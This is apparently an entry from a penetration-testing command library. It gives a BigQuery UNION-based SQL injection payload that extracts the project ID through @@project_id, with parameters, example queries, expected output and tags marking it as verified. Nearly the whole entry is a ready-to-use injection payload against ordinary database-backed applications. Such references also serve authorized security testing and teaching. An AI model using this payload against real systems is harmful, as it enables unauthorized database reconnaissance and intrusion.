---
type: command
executor: sql
data: >-
  UNION ALL SELECT (SELECT @@project_id), 1, 1, 1, 1, 1, 1 AS T1 GROUP BY
  $_COLUMN_NAME
output: null
created_at: '2023-04-06T03:56:32.353364+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - GCP
tags:
  - sqli
  - metadata-extraction
verified: true
validated: true
---

# bigquery-union-select-project-id

## Command

```sql
UNION ALL SELECT (SELECT @@project_id), 1, 1, 1, 1, 1, 1 AS T1 GROUP BY $_COLUMN_NAME
```

## Description

Injects a subquery to extract the BigQuery project ID via the @@project_id variable, padded with constants and aliased for union compatibility.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_COLUMN_NAME | Column for grouping (use a known column) | Yes |

## Examples

### Basic Usage

```sql
SELECT * FROM table UNION ALL SELECT (SELECT @@project_id), 1, 1, 1, 1, 1, 1 AS T1 GROUP BY id
```

### Advanced Usage

```sql
SELECT * FROM table UNION ALL SELECT (SELECT @@project_id), NULL, 'info' AS T1 GROUP BY id
```

## Expected Output

Injected row with project ID:

| col1     | col2 | col3 | ... |
|----------|------|------|-----|
| myproj-123 | 1    | 1    | ... |

## Related

- [[procedures/BigQuery-Union-Based-SQL-Injection]]
